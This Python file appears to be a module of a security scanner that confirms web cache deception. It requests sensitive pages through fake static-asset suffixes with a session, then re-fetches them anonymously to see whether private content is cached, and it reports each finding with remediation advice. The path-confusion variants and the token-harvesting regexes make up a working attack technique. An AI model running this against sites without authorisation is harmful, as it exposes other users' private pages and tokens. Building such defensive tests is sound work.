"""
WebCacheDeceptionModule — confirmed web cache deception.

Distinct from cache_poisoning.py (which manipulates an unkeyed header to
poison a shared response): here a path-confusion trick makes a caching layer
store a *personalized, authenticated* response under a URL it treats as a
static asset — so the next, unauthenticated visitor is served someone else's
private page.

Proof discipline (near-zero false positive — it reports only when it actually
pulls personalized content out of the cache without credentials):

  1. Establish personalization: fetch a sensitive path WITH the scan's auth
     context and WITHOUT it. Find a token present only in the authenticated
     body (an email, CSRF token, username) — proof the page is per-user.
  2. Path confusion: request `/path/<random>.css` (and a few variants) WITH
     auth. Require it to still return the personalized token (the server
     mapped the fake static path back to the real page) AND to look
     cacheable (not no-store/private, or an explicit cache hit/age header).
  3. Confirm the deception: request that SAME fake-static URL from a clean,
     unauthenticated session. If the personalized token comes back, a shared
     cache just served authenticated content to an anonymous request — the
     vulnerability, demonstrated end to end, not inferred.
"""
import re
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from recon.modules import BaseModule
from recon.core import markers, cancellation

# Fake static extensions caches commonly treat as "always cacheable".
STATIC_EXTS = ["css", "js", "png", "jpg", "ico", "svg", "woff"]

SENSITIVE_PATHS = [
    "account", "profile", "settings", "dashboard", "me", "user", "users/me",
    "billing", "orders", "api/me", "api/account", "api/user", "home", "inbox",
]

# Regexes for distinctive per-user tokens likely to appear in a personalized
# body but not an anonymous one.
TOKEN_PATTERNS = [
    re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),          # email
    re.compile(r'csrf["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=_\-]{16,})'),        # csrf token
    re.compile(r'(?:api[_-]?key|token)["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=_\-]{16,})'),
]

NONCACHE_DIRECTIVES = ["no-store", "private", "no-cache"]


class WebCacheDeceptionModule(BaseModule):
    NAME = "Web Cache Deception"
    MODULE_ID = "wcd"
    MODULE_LABEL = "Web Cache Deception"

    MAX_PATHS = 10

    def __init__(self, target, db, ui, context, timeout=10, delay=0.3,
                 threads=6, verbose=False, ai=None, output_dir=None):
        super().__init__(target, db, ui, context, timeout, delay, threads, verbose, ai, output_dir)
        self._found = 0

    def run(self):
        self.ui.section("Web Cache Deception — Path-Confusion Cache Poisoning of Private Pages")
        if not requests:
            return
        if not (self.auth_headers() or self.auth_cookies()):
            self.ui.info("No authenticated session available (supply --header/--cookie) — web cache "
                         "deception needs a logged-in response to prove personalization. Skipping.")
            return

        paths = self._candidate_paths()
        self.ui.info(f"Testing {len(paths)} sensitive path(s) for cacheable path-confusion.")
        for path in paths:
            if cancellation.is_cancelled():
                break
            try:
                self._test_path(path)
            except Exception as e:
                if self.verbose:
                    self.ui.error(f"wcd error on {path}: {e}")

        if self._found == 0:
            self.ui.info("No web cache deception confirmed.")
        else:
            self.ui.ok(f"Web cache deception scan complete — {self._found} confirmed finding(s).")

    def _candidate_paths(self):
        urls, seen = [], set()

        def add(u):
            u = u.split("#", 1)[0].split("?", 1)[0].rstrip("/")
            if u and u not in seen and len(urls) < self.MAX_PATHS:
                seen.add(u)
                urls.append(u)

        for p in SENSITIVE_PATHS:
            add(f"{self.base_url}/{p}")
        for ep in self.ctx.get("endpoints", []):
            low = ep.lower()
            if any(s in low for s in SENSITIVE_PATHS):
                add(ep)
        return urls

    def _auth_get(self, url):
        try:
            self._throttle()
            return self.session_auth.get(url, timeout=self.timeout,
                                         headers=self.auth_headers(), cookies=self.auth_cookies(),
                                         allow_redirects=False)
        except RequestException:
            return None

    def _anon_get(self, url):
        try:
            self._throttle()
            # A deliberately fresh, credential-free session.
            return self._session().get(url, timeout=self.timeout, allow_redirects=False)
        except RequestException:
            return None

    @property
    def session_auth(self):
        if getattr(self, "_sa", None) is None:
            self._sa = self._session()
        return self._sa

    def _test_path(self, url):
        auth_resp = self._auth_get(url)
        anon_resp = self._anon_get(url)
        if auth_resp is None or auth_resp.status_code != 200:
            return
        if not self._is_html_response(auth_resp):
            return
        auth_body = auth_resp.text or ""
        anon_body = (anon_resp.text or "") if anon_resp is not None else ""

        token = self._personalization_token(auth_body, anon_body)
        if not token:
            return  # couldn't prove the page is per-user → don't guess

        # Try cache-deception path variants.
        rnd = markers.marker("wcd")
        parsed = urllib.parse.urlparse(url)
        variants = []
        for ext in STATIC_EXTS[:4]:
            variants.append(f"{url}/{rnd}.{ext}")
            variants.append(f"{url}%2f{rnd}.{ext}")
            variants.append(f"{url};{rnd}.{ext}")

        for dec_url in variants:
            if cancellation.is_cancelled():
                return
            da = self._auth_get(dec_url)
            if da is None or da.status_code != 200:
                continue
            da_body = da.text or ""
            if token not in da_body:
                continue  # path confusion didn't map back to the real page
            if not self._looks_cacheable(da):
                continue  # server told caches not to store it — good hygiene

            # The decisive step: fetch the SAME fake-static URL anonymously.
            confirm = self._anon_get(dec_url)
            if confirm is None or confirm.status_code != 200:
                continue
            if token in (confirm.text or ""):
                self._report(url, dec_url, token, da, confirm)
                return

    def _personalization_token(self, auth_body, anon_body):
        """A string present in the authenticated body but not the anonymous
        one — evidence the page is personalized."""
        for pat in TOKEN_PATTERNS:
            for m in pat.finditer(auth_body):
                tok = m.group(1) if m.groups() else m.group(0)
                if len(tok) >= 6 and tok not in anon_body:
                    return tok
        return None

    @staticmethod
    def _looks_cacheable(resp) -> bool:
        cc = (resp.headers.get("Cache-Control", "") or "").lower()
        if any(d in cc for d in NONCACHE_DIRECTIVES):
            return False
        # Explicit positive cache signals, or simply the absence of no-store
        # (a default-cacheable response) combined with a static-looking type.
        if any(h in resp.headers for h in ("Age", "X-Cache", "CF-Cache-Status", "X-Served-From-Cache")):
            return True
        return "public" in cc or cc == "" or "max-age" in cc

    def _report(self, orig_url, dec_url, token, da, confirm):
        cache_hdr = {k: v for k, v in da.headers.items()
                     if k.lower() in ("cache-control", "age", "x-cache", "cf-cache-status")}
        added = self.db.add(
            title="Web Cache Deception — Private Page Served from Shared Cache",
            severity="high", url=orig_url, module=self.NAME,
            description=(
                f"A personalized, authenticated response for {orig_url} can be cached under a "
                f"static-looking path ({dec_url}) and then retrieved by an unauthenticated request. "
                "The scan fetched the page with the supplied session (personalized token present), "
                "re-requested it through a path-confusion variant the caching layer treats as a "
                "static asset, and then retrieved that same URL with NO credentials — and the "
                "personalized content came back. A shared cache is serving one user's private page "
                "to anyone who requests the crafted URL (web cache deception)."
            ),
            remediation=(
                "Don't let the cache key on a path extension alone: configure the CDN/cache to cache "
                "only genuine static assets (verify Content-Type, not just the URL suffix), set "
                "Cache-Control: no-store/private on authenticated responses, and normalize/reject "
                "path-confusion suffixes (trailing /x.css, %2f, ;x.css) before they reach the origin."
            ),
            cvss="7.5", confidence="CONFIRMED", confidence_score=95,
            validation_steps=["personalized_token_identified", "path_confusion_returned_private_page",
                              "response_cacheable", "anonymous_request_retrieved_private_content"],
            evidence=[f"Personalized token (redacted): {token[:3]}…{token[-2:]}",
                      f"Deception URL: {dec_url}",
                      f"Cache headers: {cache_hdr or 'default-cacheable (no no-store)'}"],
            references=[
                "https://portswigger.net/web-security/web-cache-deception",
                "https://owasp.org/www-community/attacks/Web_Cache_Deception",
            ],
        )
        if added:
            self._found += 1
            self.ui.find("high", "Web cache deception — private page cached", orig_url)
            self.ui.bullet(f"anon request to {dec_url} returned personalized content", indent=12)
